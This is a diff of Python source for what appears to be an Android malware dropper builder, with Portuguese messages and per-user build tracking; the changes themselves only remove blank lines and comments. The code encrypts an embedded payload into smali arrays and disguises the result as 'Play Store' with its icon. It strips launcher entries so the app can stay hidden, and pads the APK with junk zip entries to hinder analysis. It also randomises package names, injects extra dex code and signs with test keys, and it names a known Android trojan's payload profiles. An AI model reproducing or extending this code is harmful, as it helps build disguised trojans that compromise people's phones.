@@ -17,18 +17,14 @@ from services.build_state import BUILD_STATUS
 from services.data import add_build_history, add_history, update_amplification
 from services.java_runtime import JAVA_BIN, java_env, keytool_bin
 
-
 def encrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
     return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).encrypt(data)
-
 
 def decrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
     return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).decrypt(data)
 
-
 def _xor_bytes(data: bytes, xor_byte: int) -> bytes:
     return bytes(b ^ xor_byte for b in data)
-
 
 def _smali_byte(value: int) -> str:
     value &= 0xFF
@@ -39,11 +35,9 @@ def _smali_byte(value: int) -> str:
     neg = value - 0x100
     return f"        -0x{(-neg):x}t"
 
-
 def _smali_array_data(data: bytes) -> str:
     lines = "\n".join(_smali_byte(b) for b in data)
     return f"    .array-data 1\n{lines}\n    .end array-data"
-
 
 def _replace_smali_array(content: str, label: str, data: bytes) -> str:
     pattern = rf"(:{re.escape(label)}\s*\n)\s*\.array-data 1\n.*?\n\s*\.end array-data"
@@ -52,7 +46,6 @@ def _replace_smali_array(content: str, label: str, data: bytes) -> str:
     if n != 1:
         raise RuntimeError(f"Falha ao patchar array smali :{label} (matches={n})")
     return new_content
-
 
 def patch_vd_crypto_smali(
     dropper_work: str,
@@ -132,7 +125,6 @@ def patch_vd_crypto_smali(
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(content)
 
-
 def _axml_string_pool(data: bytes) -> list[str]:
     import struct
 
@@ -185,7 +177,6 @@ def _axml_string_pool(data: bytes) -> list[str]:
                 p += 2
             out.append(data[p : p + length * 2].decode("utf-16-le", "replace"))
     return out
-
 
 def extract_apk_package_name(apk_path: str) -> str:
     with zipfile.ZipFile(apk_path, "r") as zf:
@@ -241,14 +232,12 @@ def extract_apk_package_name(apk_path: str) -> str:
         return cands[0]
     raise RuntimeError(f"Nao foi possivel extrair package do payload: {apk_path}")
 
-
 def _find_main_activity_smali(dropper_work: str) -> str:
     smali_root = os.path.join(dropper_work, "smali")
     for root_dir, _, files in os.walk(smali_root):
         if "MainActivity.smali" in files and root_dir.replace("\\", "/").endswith("/ui"):
             return os.path.join(root_dir, "MainActivity.smali")
     raise RuntimeError("MainActivity.smali nao encontrado apos rename.")
-
 
 def _patch_mainactivity_prefer_tp_asset(dropper_work: str) -> None:
     path = _find_main_activity_smali(dropper_work)
@@ -283,13 +272,10 @@ def _patch_mainactivity_prefer_tp_asset(dropper_work: str) -> None:
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(content)
 
-
 PAYLOAD_DISPLAY_NAME = "Play Store"
 PAYLOAD_DISPLAY_ICON = os.path.join(BASE_DIR, "assets", "play_store_icon.png")
 
-
 def sanitize_launcher_icon_conflicts(dropper_work: str) -> None:
-    """Remove adaptive XML when a bitmap launcher exists for the same resource name."""
     res_dir = os.path.join(dropper_work, "res")
     if not os.path.isdir(res_dir):
         return
@@ -321,7 +307,6 @@ def sanitize_launcher_icon_conflicts(dropper_work: str) -> None:
                 "anydpi" in os.path.basename(folder).lower() and has_density_bitmap
             ):
                 os.remove(xml_path)
-
 
 def _extract_launch_class(manifest_xml: str, payload_package: str) -> str:
     pkg = (payload_package or "").strip()
@@ -376,7 +361,6 @@ def _extract_launch_class(manifest_xml: str, payload_package: str) -> str:
         return f"{pkg}.Splasher"
     raise RuntimeError("Nao foi possivel determinar launch_class do payload")
 
-
 def _values_strings_xml_paths(decode_dir: str) -> list[str]:
     res_dir = os.path.join(decode_dir, "res")
     if not os.path.isdir(res_dir):
@@ -390,7 +374,6 @@ def _values_strings_xml_paths(decode_dir: str) -> list[str]:
             paths.append(strings_xml)
     return paths
 
-
 def _strings_xml_has_key(strings_xml: str, key: str) -> bool:
     try:
         with open(strings_xml, "r", encoding="utf-8", errors="ignore") as handle:
@@ -398,7 +381,6 @@ def _strings_xml_has_key(strings_xml: str, key: str) -> bool:
     except OSError:
         return False
     return re.search(rf'<string\s+name="{re.escape(key)}"', content) is not None
-
 
 def _detect_btmob_payload_profile(decode_dir: str) -> str:
     has_my_app_name = False
@@ -417,7 +399,6 @@ def _detect_btmob_payload_profile(decode_dir: str) -> str:
         "ou 3.6 legado (BaseName)"
     )
 
-
 def _strip_launcher_categories(
     manifest_xml: str, *, legacy: bool = False
 ) -> tuple[str, int]:
@@ -429,7 +410,6 @@ def _strip_launcher_categories(
         rf"(?:{'|'.join(categories)})\"\s*/>\s*\n?"
     )
     return re.subn(pattern, "", manifest_xml, flags=re.I)
-
 
 def _set_string_resource(strings_xml: str, resource_name: str, value: str) -> None:
     try:
@@ -458,7 +438,6 @@ def _set_string_resource(strings_xml: str, resource_name: str, value: str) -> No
             raise RuntimeError(f"falha ao setar {resource_name}: {exc}") from exc
         with open(strings_xml, "w", encoding="utf-8") as handle:
             handle.write(sx2)
-
 
 def prepare_payload(
     payload_apk_path: str,
@@ -593,7 +572,6 @@ def prepare_payload(
     except Exception:
         raise
 
-
 def patch_w_explicit_launch(dropper_work: str, launch_class: str) -> None:
     launch_class = (launch_class or "").strip()
     if not launch_class or " " in launch_class or "\"" in launch_class:
@@ -661,7 +639,6 @@ def patch_w_explicit_launch(dropper_work: str, launch_class: str) -> None:
     with open(path, "w", encoding="utf-8") as handle:
         handle.write(content)
 
-
 def bind_target_package(
     dropper_work: str,
     payload_package: str,
@@ -715,12 +692,10 @@ def bind_target_package(
     else:
         _patch_mainactivity_prefer_tp_asset(dropper_work)
 
-
 def patch_payload_util_smali(*args, **kwargs):
     raise RuntimeError(
         "patch_payload_util_smali removido: use patch_vd_crypto_smali (template Wi-Fi)."
     )
-
 
 def generate_package_name(app_name=None):
     mid = "".join(secrets.choice(string.ascii_lowercase) for _ in range(5))
@@ -731,7 +706,6 @@ def generate_package_name(app_name=None):
     if len(pkg) != 14:
         raise RuntimeError(f"package length bug: {pkg!r} len={len(pkg)}")
     return pkg
-
 
 def apply_package_rename(dropper_work, old_package, new_package):
     old_path = old_package.replace(".", "/")
@@ -773,7 +747,6 @@ def apply_package_rename(dropper_work, old_package, new_package):
         except OSError:
             break
 
-
 def _set_status(build_id, status, progress, error=False, portal=None, owner=None, ephemeral=None):
     current = BUILD_STATUS.get(build_id, {})
     BUILD_STATUS[build_id] = {
@@ -786,15 +759,11 @@ def _set_status(build_id, status, progress, error=False, portal=None, owner=None
         "output_file": current.get("output_file"),
     }
 
-
 def _epoch_date_time():
     return tuple(Config.ZIP_EPOCH_DATE_TIME)
 
-
 def _zip_entry_name(name: str) -> str:
-    """Normalize ZIP entry names so Windows zipfile cannot collapse \\ into / duplicates."""
     return (name or "").replace("\\", "/")
-
 
 def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> bytes:
     if payload_bytes[:4] != b"PK\x03\x04":
@@ -803,8 +772,6 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
         return payload_bytes
 
     noise_n = random.randint(Config.PAYLOAD_ZIP_NOISE_MIN, Config.PAYLOAD_ZIP_NOISE_MAX)
-    # Keep junk path-like, but never use backslashes: on Windows, Python's zipfile
-    # converts \\ to / and silently creates duplicate entries that break PackageManager.
     junk_suffixes = (
         "..xml",
         "/..xml",
@@ -906,7 +873,6 @@ def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> 
                     pass
     return noised
 
-
 def normalize_apk_zip_timestamps(apk_path: str) -> None:
     if not os.path.isfile(apk_path):
         raise RuntimeError(f"APK ausente para normalize timestamps: {apk_path}")
@@ -921,8 +887,6 @@ def normalize_apk_zip_timestamps(apk_path: str) -> None:
             out.create_system = info.create_system
             zout.writestr(out, data)
     os.replace(tmp_path, apk_path)
-
-
 
 def inject_unknown_into_apk(apk_path: str, dropper_work: str) -> int:
     unknown_dir = os.path.join(dropper_work, "unknown")
@@ -970,10 +934,8 @@ def inject_unknown_into_apk(apk_path: str, dropper_work: str) -> int:
     os.replace(tmp_path, apk_path)
     return added
 
-
 def inject_unknown_meta_inf(apk_path: str, dropper_work: str) -> int:
     return inject_unknown_into_apk(apk_path, dropper_work)
-
 
 def inject_secondary_dex(apk_path: str, dex_path: str, arcname: str = "classes2.dex") -> None:
     if not getattr(Config, "INJECT_SECONDARY_DEX", False):
@@ -1005,7 +967,6 @@ def inject_secondary_dex(apk_path: str, dex_path: str, arcname: str = "classes2.
             zout.writestr(out_info, handle.read())
     os.replace(tmp_path, apk_path)
 
-
 def apply_version_info(dropper_work: str, version_name: str, version_code: int) -> None:
     yml = os.path.join(dropper_work, "apktool.yml")
     if not os.path.isfile(yml):
@@ -1026,7 +987,6 @@ def apply_version_info(dropper_work: str, version_name: str, version_code: int) 
     )
     with open(yml, "w", encoding="utf-8") as handle:
         handle.write(text)
-
 
 def _generate_keystore(
     keystore_path: str,
@@ -1070,7 +1030,6 @@ def _generate_keystore(
         err = (result.stderr or result.stdout or "keytool falhou").strip()
         raise RuntimeError(f"Falha ao gerar keystore: {err[:300]}")
 
-
 def ensure_release_keystore() -> tuple[str, str, str, str]:
     path = Config.RELEASE_KEYSTORE
     store_pass = Config.RELEASE_KEYSTORE_PASS
@@ -1079,7 +1038,6 @@ def ensure_release_keystore() -> tuple[str, str, str, str]:
     if not os.path.isfile(path):
         _generate_keystore(path, store_pass, alias, key_pass, Config.RELEASE_DNAME)
     return path, store_pass, alias, key_pass
-
 
 def _resolve_sdk_tool(path: str) -> str:
     if path and os.path.isfile(path):
@@ -1092,7 +1050,6 @@ def _resolve_sdk_tool(path: str) -> str:
             return candidate
     return path
 
-
 def zipalign_apk(input_apk: str, output_apk: str) -> None:
     zipalign = _resolve_sdk_tool(Config.ZIPALIGN)
     if not os.path.isfile(zipalign):
@@ -1104,7 +1061,6 @@ def zipalign_apk(input_apk: str, output_apk: str) -> None:
     if result.returncode != 0 or not os.path.isfile(output_apk):
         err = (result.stderr or result.stdout or "zipalign falhou").strip()
         raise RuntimeError(f"Falha no zipalign: {err[:300]}")
-
 
 def sign_with_apksigner(
     aligned_apk: str,
@@ -1163,7 +1119,6 @@ def sign_with_apksigner(
         raise RuntimeError(f"Falha na assinatura: {err[:300]}")
     return output_apk
 
-
 def sign_release_apk(aligned_apk: str, output_apk: str) -> str:
     mode = (Config.SIGNING_MODE or "aosp_testkey").strip().lower()
     if mode == "aosp_testkey":
@@ -1182,7 +1137,6 @@ def sign_release_apk(aligned_apk: str, output_apk: str) -> str:
         key_alias=key_alias,
         key_pass=key_pass,
     )
-
 
 def process_apk(
     build_id,
@@ -1491,11 +1445,4 @@ def process_apk(
         if persist:
             add_build_history(username, custom_app_name, "erro", build_id)
             update_amplification(username, "erro")
-
-
-
-
-
-
-
 
